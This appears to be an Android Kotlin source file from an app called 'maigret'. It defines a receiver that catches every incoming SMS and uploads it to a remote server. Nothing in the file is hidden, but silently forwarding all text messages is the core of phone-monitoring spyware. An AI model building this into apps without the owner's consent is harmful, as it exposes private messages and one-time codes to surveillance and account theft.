package app.maigret.receivers.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import app.maigret.commands.Upload
import app.maigret.db.Entities
import app.maigret.utils.sms.intentToSms

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val sms: Entities.Sms = intentToSms(intent)
                ?: return

            // Send newly received sms to server
            Upload.sms(sms)
        }
    }
}
